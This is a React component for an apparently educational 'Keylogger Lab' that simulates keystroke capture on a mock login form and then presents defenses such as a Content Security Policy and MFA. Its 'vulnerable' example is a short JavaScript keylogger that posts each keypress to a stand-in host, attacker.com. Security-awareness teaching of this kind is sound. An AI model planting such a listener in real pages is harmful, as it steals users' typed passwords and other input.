import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { useNavigate } from 'react-router-dom';
import {
  ChevronLeft, Keyboard, ShieldCheck, Terminal, 
  Zap, Activity, ShieldAlert, CheckCircle2, XCircle,
  ArrowRight, LayoutDashboard, Eye, EyeOff, Download, MousePointer2
} from 'lucide-react';

const Keylogger = () => {
  const navigate = useNavigate();
  const [step, setStep] = useState(0);
  const [terminalLines, setTerminalLines] = useState([]);
  const [isSecured, setIsSecured] = useState(false);
  const [capturedKeys, setCapturedKeys] = useState('');
  const [isLogging, setIsLogging] = useState(false);
  const [mockInput, setMockInput] = useState('');
  const terminalEndRef = useRef(null);

  useEffect(() => {
    terminalEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [terminalLines]);

  const attackVectors = [
    {
      id: 'software',
      title: "Software Keylogger",
      payload: "system_hook_driver.exe",
      intel: "Malicious software intercepts OS-level keyboard events and logs them to a hidden file or remote server.",
      vulnCode: `// Vulnerable: Standard input capture
document.addEventListener('keydown', (e) => {
  fetch('https://attacker.com/log', {
    method: 'POST',
    body: JSON.stringify({ key: e.key })
  });
});`,
      fixCode: `// Defense: Use Virtual Keyboards or MFA
// Also, implement Content Security Policy (CSP)
// to prevent unauthorized data exfiltration.
Content-Security-Policy: connect-src 'self';`,
      remedy: ["Use Multi-Factor Authentication (MFA)", "Keep Anti-Virus Definitions Updated", "Use Virtual Keyboards for Sensitive Data"]
    }
  ];

  const handleInfection = async () => {
    setStep(1);
    setTerminalLines([
      "[INIT] Keylogger Module Initialized",
      "[HOOK] Hooking into User32.dll keyboard events...",
      "[WAIT] Awaiting user input..."
    ]);
    setIsLogging(true);
  };

  const handleInputChange = (e) => {
    const val = e.target.value;
    setMockInput(val);
    if (isLogging) {
      const lastChar = val.slice(-1);
      if (lastChar) {
        setCapturedKeys(prev => prev + lastChar);
        setTerminalLines(prev => [...prev, `[KEY] Captured: '${lastChar}'`]);
      }
    }
  };

  const resetLab = () => {
    setTerminalLines([]);
    setCapturedKeys('');
    setMockInput('');
    setIsSecured(false);
    setIsLogging(false);
    setStep(0);
  };

  return (
    <div className="min-h-screen bg-[#020617] text-slate-300 font-sans p-4 sm:p-8 selection:bg-cyan-500/30">
      <div className="max-w-6xl mx-auto">

        {/* HEADER */}
        <header className="flex flex-col sm:flex-row justify-between items-center mb-10 gap-6">
          <div className="flex items-center gap-4 w-full sm:w-auto">
            <button onClick={() => navigate('/dashboard')} className="bg-cyan-500 p-2.5 rounded-xl hover:bg-cyan-400 transition-colors shrink-0">
              <ChevronLeft className="text-black" size={20} />
            </button>
            <div>
              <h1 className="text-xl md:text-2xl font-black text-white uppercase italic tracking-tighter">HackAware <span className="text-cyan-500 text-xs md:text-sm">PRO</span></h1>
              <p className="text-[9px] font-mono text-slate-500 uppercase tracking-[0.2em]">Keylogger Lab / Node_Mumbai</p>
            </div>
          </div>

          <div className="flex bg-slate-900/80 p-1 rounded-xl border border-slate-800 shadow-lg w-full sm:w-auto">
            <button onClick={() => navigate('/dashboard')} className="flex-1 sm:flex-none flex items-center justify-center gap-2 px-4 py-2 rounded-lg text-[10px] font-black text-slate-600 hover:text-white uppercase transition-all">
              <LayoutDashboard size={14}/> <span>Dashboard</span>
            </button>
            <div className="w-[1px] h-4 bg-slate-800 my-auto mx-1" />
            <button className="flex-1 sm:flex-none flex items-center justify-center gap-2 px-4 py-2 rounded-lg text-[10px] font-black bg-cyan-500 text-black uppercase shadow-[0_0_15px_rgba(6,182,212,0.3)]">
              <Keyboard size={14}/> Keylogger_Lab
            </button>
          </div>
        </header>

        {/* STEP NAVIGATION */}
        <div className="mb-8 flex justify-center">
          <div className="flex bg-slate-900/40 p-1 rounded-xl border border-slate-800 backdrop-blur-md">
            {["1. Infection", "2. Capture", "3. Defense"].map((label, i) => {
              return (
                <button
                  key={i}
                  onClick={() => setStep(i)}
                  className={`px-6 py-2 rounded-lg text-[10px] font-black uppercase transition-all 
                    ${step === i ? 'text-cyan-400 bg-cyan-500/10' : 'text-slate-600'}
                    hover:text-slate-300`}
                >
                  {label}
                </button>
              );
            })}
          </div>
        </div>

        <AnimatePresence mode="wait">
          {step === 0 && (
            <motion.div key="s1" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="max-w-2xl mx-auto" exit={{ opacity: 0, y: -10 }}>
              <div className="bg-slate-900/40 border border-slate-800 p-8 rounded-3xl backdrop-blur-sm text-center">
                <div className="w-20 h-20 bg-red-500/10 rounded-full flex items-center justify-center mx-auto mb-6 border border-red-500/20">
                  <Download className="text-red-500" size={32} />
                </div>
                <h3 className="text-white text-xl font-black uppercase mb-4">Initial Infection Vector</h3>
                <p className="text-slate-400 text-sm mb-8 leading-relaxed">
                  Keyloggers often enter a system through malicious downloads, email attachments, or social engineering. 
                  In this simulation, we'll demonstrate how a keylogger intercepts every keystroke once active.
                </p>
                <button 
                  onClick={handleInfection}
                  className="w-full py-4 bg-red-500 text-black font-black uppercase text-xs rounded-xl flex items-center justify-center gap-2 hover:bg-red-400 transition-all shadow-lg shadow-red-500/20"
                >
                  Deploy Keylogger <Zap size={16}/>
                </button>
              </div>
            </motion.div>
          )}

          {step === 1 && (
            <motion.div key="s2" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="grid grid-cols-1 lg:grid-cols-12 gap-8">
              <div className="lg:col-span-5 space-y-6">
                <div className="bg-slate-900/40 border border-slate-800 p-6 rounded-3xl">
                  <h3 className="text-white text-xs font-black uppercase mb-6 flex items-center gap-2">
                    <MousePointer2 size={16} className="text-cyan-500"/> Victim Input Simulation
                  </h3>
                  <div className="space-y-4">
                    <p className="text-[10px] text-slate-500 uppercase font-bold">Mock Login Form</p>
                    <input 
                      type="text" 
                      placeholder="Username" 
                      className="w-full bg-black/50 border border-slate-800 p-4 rounded-xl text-xs outline-none focus:border-cyan-500 transition-all"
                    />
                    <input 
                      type="password" 
                      value={mockInput}
                      onChange={handleInputChange}
                      placeholder="Sensitive Password" 
                      className="w-full bg-black/50 border border-slate-800 p-4 rounded-xl text-xs outline-none focus:border-cyan-500 transition-all"
                    />
                    <div className="p-4 bg-cyan-500/5 border border-cyan-500/20 rounded-xl">
                      <p className="text-[10px] text-cyan-500 font-bold uppercase mb-1">Instruction:</p>
                      <p className="text-[10px] text-slate-400">Type in the password field above to see how the keylogger captures each character in the console.</p>
                    </div>
                  </div>
                </div>

                <div className="bg-red-500/5 border border-red-500/20 p-6 rounded-3xl">
                  <h3 className="text-red-400 text-xs font-black uppercase mb-4 flex items-center gap-2">
                    <ShieldAlert size={16}/> Captured Data
                  </h3>
                  <div className="bg-black/40 p-4 rounded-xl font-mono text-sm text-red-400 break-all min-h-[60px]">
                    {capturedKeys || <span className="text-slate-700 italic">Awaiting keystrokes...</span>}
                  </div>
                </div>

                <button onClick={() => setStep(2)} className="w-full py-4 bg-slate-800 text-slate-300 font-black uppercase text-[10px] rounded-xl flex items-center justify-center gap-2 border border-slate-700">
                  View Defense Playbook <ArrowRight size={14}/>
                </button>
              </div>

              <div className="lg:col-span-7 bg-black/60 border border-slate-800 rounded-3xl p-6 flex flex-col h-[480px]">
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-[10px] font-black text-slate-500 uppercase tracking-widest flex items-center gap-2">
                    <Terminal size={14}/> Attacker Console
                  </h3>
                  <span className="text-[9px] font-black text-red-500 uppercase flex items-center gap-1 animate-pulse">
                    <Activity size={12}/> Logging Active
                  </span>
                </div>
                <div className="flex-1 overflow-y-auto font-mono text-[11px] space-y-1 pr-2">
                  {terminalLines.map((line, i) => (
                    <div key={i} className={line.includes('[KEY]') ? 'text-red-400' : 'text-slate-500'}>
                      {line}
                    </div>
                  ))}
                  <div ref={terminalEndRef} />
                </div>
              </div>
            </motion.div>
          )}

          {step === 2 && (
            <motion.div key="s3" initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} className="grid grid-cols-1 lg:grid-cols-2 gap-8">
              <div className="bg-slate-900/40 border border-slate-800 p-6 rounded-3xl">
                <h3 className="text-red-400 text-[10px] font-black uppercase mb-4 flex items-center gap-2"><XCircle size={14}/> Vulnerable Implementation</h3>
                <pre className="bg-black p-4 rounded-xl text-[10px] text-red-300 font-mono overflow-x-auto whitespace-pre-wrap">
                  {attackVectors[0].vulnCode}
                </pre>
              </div>
              <div className="bg-slate-900/40 border border-slate-800 p-6 rounded-3xl">
                <h3 className="text-emerald-400 text-[10px] font-black uppercase mb-4 flex items-center gap-2"><CheckCircle2 size={14}/> Defensive Strategy</h3>
                <pre className="bg-black p-4 rounded-xl text-[10px] text-emerald-300 font-mono overflow-x-auto whitespace-pre-wrap">
                  {attackVectors[0].fixCode}
                </pre>
              </div>

              <div className="lg:col-span-2 bg-slate-900/40 border border-slate-800 p-6 rounded-3xl">
                <h3 className="text-white text-[10px] font-black uppercase mb-4 flex items-center gap-2"><ShieldCheck size={14} className="text-cyan-500"/> Remediation Checklist</h3>
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 mb-6">
                  {attackVectors[0].remedy.map((r, i) => (
                    <div key={i} className="flex items-center gap-2 bg-black/40 border border-slate-800 p-4 rounded-xl">
                      <ShieldCheck size={14} className="text-cyan-500 shrink-0" />
                      <span className="text-[10px] font-bold text-slate-300 uppercase">{r}</span>
                    </div>
                  ))}
                </div>
                <button onClick={resetLab} className="flex items-center gap-2 px-6 py-3 bg-slate-800 hover:bg-slate-700 text-white text-[10px] font-black uppercase rounded-xl transition-all">
                   Reset Environment
                </button>
              </div>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
};

export default Keylogger;
